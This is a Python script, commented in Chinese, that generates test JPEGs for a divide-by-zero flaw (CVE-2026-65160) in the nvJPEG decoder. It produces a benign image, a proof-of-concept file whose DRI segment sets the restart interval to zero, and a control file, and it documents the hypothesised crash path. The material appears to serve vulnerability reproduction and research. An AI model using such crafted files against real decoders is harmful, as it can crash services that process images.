#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F15 受控样本生成器  —  CVE-2026-65160  (nvJPEG, CWE-369 除零)

【假设】换到尚未探索的 DRI / 重启间隔维度（不是采样因子、不是高度）：
  除零发生在派生量
        num_restart_segments = total_mcus / restart_interval
  （即解码前把一帧切成若干重启段 / 推导每段 MCU 数时用到的商）。
  restart_interval 来自 JPEG 的 DRI 段 (FFDD) 的 Ri 值；total_mcus 由 SOF 的
  width、height、采样因子等合法字段算出。
  Ri = 0 在 T.81 中是合法且常见的取值，语义为“本图像不使用重启标记”，
  因此它不同于被头解析合法性校验直接拦下的非法零字段（采样因子=0、
  高度=0）。当合法字段组合（Ri=0，且图像至少有 1 个 MCU）被代入上述
  派生式时，商变成“除以 0”，在解码路径触发 CWE-369。
  若实现正确特判 Ri==0 为“无重启”，则本样本退化为合法解码（这是预期的
  负对照行为）。把 Ri 恢复成合法的非零值（=整帧 MCU 数）即得到 ctrl。

【构造】
  benign_64x64_baseline.jpg : 8 位灰度 64x64 baseline 合法 JPEG，无 DRI
  poc_dri0_64x64.jpg        : 同尺寸 baseline，插入 DRI(Ri=0)，
                              熵数据为合法全零块（DC diff=0 + AC EOB）
  ctrl_dri64_64x64.jpg      : 与 poc 完全相同，仅把 Ri=0 恢复为合法值 Ri=64
                              (= total_mcus，单重启段覆盖整帧，无需 RST)

仅使用 Python 标准库；不联网；不读取任何外部样本。
"""
import struct
import hashlib
import os


def u16(n):
    return struct.pack('>H', n)


# ---- 标准 JPEG Huffman 表 (ITU-T T.81 Annex K.3) ----
DC_BITS = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
DC_VALS = list(range(12))

AC_BITS = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7d]
AC_VALS = [
    0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
    0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xa1, 0x08, 0x23, 0x42, 0xb1, 0xc1, 0x15, 0x52, 0xd1, 0xf0,
    0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0a, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x25, 0x26, 0x27, 0x28,
    0x29, 0x2a, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
    0x4a, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
    0x6a, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
    0x8a, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9a, 0xa2, 0xa3, 0xa4, 0xa5, 0xa6, 0xa7,
    0xa8, 0xa9, 0xaa, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xc2, 0xc3, 0xc4, 0xc5,
    0xc6, 0xc7, 0xc8, 0xc9, 0xca, 0xd2, 0xd3, 0xd4, 0xd5, 0xd6, 0xd7, 0xd8, 0xd9, 0xda, 0xe1, 0xe2,
    0xe3, 0xe4, 0xe5, 0xe6, 0xe7, 0xe8, 0xe9, 0xea, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8,
    0xf9, 0xfa,
]

# 标准亮度量化表（zig-zag 顺序，Annex K.1）
DQT_LUM = [
    16, 11, 10, 16, 24, 40, 51, 61,
    12, 12, 14, 19, 26, 58, 60, 55,
    14, 13, 16, 24, 40, 57, 69, 56,
    14, 17, 22, 29, 51, 87, 80, 62,
    18, 22, 37, 56, 68, 109, 103, 77,
    24, 35, 55, 64, 81, 104, 113, 92,
    49, 64, 78, 87, 103, 121, 120, 101,
    72, 92, 95, 98, 112, 100, 103, 99,
]


class BitWriter:
    """按 JPEG 规则把 Huffman 比特串成字节（末尾补 1）。"""
    def __init__(self):
        self.bits = []

    def write(self, code):
        for c in code:
            self.bits.append(1 if c == '1' else 0)

    def get_bytes(self):
        bits = self.bits[:]
        while len(bits) % 8 != 0:
            bits.append(1)
        out = bytearray()
        for i in range(0, len(bits), 8):
            b = 0
            for j in range(8):
                b = (b << 1) | bits[i + j]
            out.append(b)
        return bytes(out)


def make_baseline(width, height, restart_interval=None):
    """
    生成 8 位单分量灰度 baseline JPEG。
    每个 8x8 块的系数全为 0（DC diff=0, AC EOB），因此只用到标准
    DC 表类别 0 的码字 "00" 与 AC 表 EOB 的码字 "1010"。
    restart_interval：None -> 不写 DRI；否则写入 DRI 段并在 RST 边界处
    按需要插入重启标记（本构造只用 1 段，故不插 RST）。
    """
    out = bytearray()
    out += b'\xff\xd8'  # SOI

    # APP0 / JFIF
    app0 = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    out += b'\xff\xe0' + u16(len(app0) + 2) + app0

    # DQT (Pq=0, Tq=0)
    dqt = bytes([0x00] + list(DQT_LUM))
    out += b'\xff\xdb' + u16(len(dqt) + 2) + dqt

    # SOF0：precision=8, height, width, ncomp=1, [id=1, samp=0x11, q=0]
    sof = bytes([8]) + u16(height) + u16(width) + bytes([1]) + bytes([1, 0x11, 0])
    out += b'\xff\xc0' + u16(len(sof) + 2) + sof

    # DHT：DC(0) + AC(0)
    dht = bytearray()
    dht += bytes([0x00]) + bytes(DC_BITS) + bytes(DC_VALS)
    dht += bytes([0x10]) + bytes(AC_BITS) + bytes(AC_VALS)
    out += b'\xff\xc4' + u16(len(dht) + 2) + bytes(dht)

    # DRI（可选）
    if restart_interval is not None:
        out += b'\xff\xdd' + u16(4) + u16(restart_interval)

    # SOS：ncomp=1，[id=1, dc=0, ac=0]，Ss=0, Se=63, AhAl=0x00
    sos = bytes([1]) + bytes([1, 0x00, 0x00]) + bytes([0, 63, 0])
    out += b'\xff\xda' + u16(len(sos) + 2) + sos

    # 熵编码数据：每个 8x8 块 = DC(0) + EOB
    n_mcu_x = (width + 7) // 8
    n_mcu_y = (height + 7) // 8
    n_blocks = n_mcu_x * n_mcu_y  # 灰度 4:4:4，1 块/MCU
    bw = BitWriter()
    for _ in range(n_blocks):
        bw.write("00")    # DC diff = 0, category 0
        bw.write("1010")  # AC EOB
    entropy = bw.get_bytes()
    out += entropy

    out += b'\xff\xd9'  # EOI
    return bytes(out)


def write_and_report(role, fname, data):
    with open(fname, 'wb') as f:
        f.write(data)
    sha = hashlib.sha256(data).hexdigest()
    print("[F15_FILE] %s %s %d %s" % (role, fname, len(data), sha))
    return sha


def main():
    W, H = 64, 64
    total_mcus = ((W + 7) // 8) * ((H + 7) // 8)  # 灰度 4:4:4：8*8 = 64

    print("[F15_PLAN] 假设除零发生在派生量 num_restart_segments = total_mcus / restart_interval；"
          "restart_interval 取自 DRI 段 Ri=0（T.81 合法的“无重启”标志），"
          "total_mcus 由 SOF 合法尺寸算出，商为除以 0。")

    benign = make_baseline(W, H, restart_interval=None)
    poc = make_baseline(W, H, restart_interval=0)
    ctrl = make_baseline(W, H, restart_interval=total_mcus)

    write_and_report("benign", "benign_64x64_baseline.jpg", benign)
    write_and_report("poc", "poc_dri0_64x64.jpg", poc)
    write_and_report("ctrl", "ctrl_dri%d_64x64.jpg" % total_mcus, ctrl)


if __name__ == "__main__":
    main()